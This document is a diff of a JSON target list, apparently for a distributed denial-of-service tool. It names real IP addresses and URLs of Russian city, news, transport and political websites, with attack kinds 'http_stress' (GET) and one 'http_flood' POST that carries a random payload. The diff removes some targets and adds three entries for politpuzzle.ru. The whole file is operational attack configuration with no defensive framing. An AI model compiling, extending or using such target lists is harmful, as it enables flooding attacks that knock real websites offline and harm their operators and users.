@@ -1,16 +1,5 @@
 [
-  {"kind":"http_stress","method":"GET","ip":"185.253.181.10","port": 443, "url": "https://31stk.ru/"},
-  {"kind":"http_stress","method":"GET","ip":"87.236.19.158","port": 80, "url": "http://internet-belgorod.ru/"},
-  {"kind":"http_stress","method":"GET","ip":"37.140.192.138","port": 443, "url": "https://inetspace.ru/"},
-  {"kind":"http_stress","method":"GET","ip":"194.190.28.4","port": 443, "url": "https://belrts.ru/"},
-  {"kind":"http_stress","method":"GET","ip":"212.109.218.234","port": 443, "url": "https://gorod-novoross.ru/"},
-  {"kind":"http_flood","method":"POST","ip":"212.109.218.234","port": 443, "url": "https://gorod-novoross.ru/", "headers":{"Content-Type": "application/json"}, "body": "template:{{ random(256) }}"},
-  {"kind":"http_stress","method":"GET","ip":"77.222.40.74","port": 443, "url": "https://sutynews.ru/"},
   {"kind":"http_stress","method":"GET","ip":"87.236.16.130","port": 443, "url": "https://online-vokzal.ru/"},
-  {"kind":"http_stress","method":"GET","ip":"45.130.41.77","port": 443, "url": "https://alushta24.org/"},
-  {"kind":"http_stress","method":"GET","ip":"87.117.26.124","port": 443, "url": "https://tourism.rostov-gorod.ru/"},
-  {"kind":"http_stress","method":"GET","ip":"87.117.26.92","port": 443, "url": "https://rostov-gorod.ru/"},
-  {"kind":"http_stress","method":"GET","ip":"89.108.105.30","port": 443, "url": "https://lipetskcity.ru"},
   {"kind":"http_stress","method":"GET","ip":"87.236.16.254","port": 443, "url": "https://avtovokzal-anapa.ru/"},
   {"kind":"http_stress","method":"GET","ip":"178.159.244.31","port": 443, "url": "https://trucks.primum1.com/"},
   {"kind":"http_stress","method":"GET","ip":"178.159.244.31","port": 443, "url": "https://primum1.com/"},
@@ -21,5 +10,8 @@
   {"kind":"http_stress","method":"GET","ip":"109.68.214.200","port": 443, "url": "https://wagner2022.ru/"},
   {"kind":"http_stress","method":"GET","ip":"185.4.73.250","port": 443, "url": "https://zakon.wiki/"},
   {"kind":"http_stress","method":"GET","ip":"31.31.198.123","port": 443, "url": "https://wartorg.com/"},
-  {"kind":"http_stress","method":"GET","ip":"176.99.14.63","port": 443, "url": "https://rabota-vybor.ru/"}
+  {"kind":"http_stress","method":"GET","ip":"176.99.14.63","port": 443, "url": "https://rabota-vybor.ru/"},
+  {"kind":"http_stress","method":"GET","ip":"185.107.73.205","port": 443, "url": "https://politpuzzle.ru/"},
+  {"kind":"http_stress","method":"GET","ip":"185.107.73.215","port": 443, "url": "https://politpuzzle.ru/"},
+  {"kind":"http_stress","method":"GET","ip":"185.107.73.225","port": 443, "url": "https://politpuzzle.ru/"}
 ]
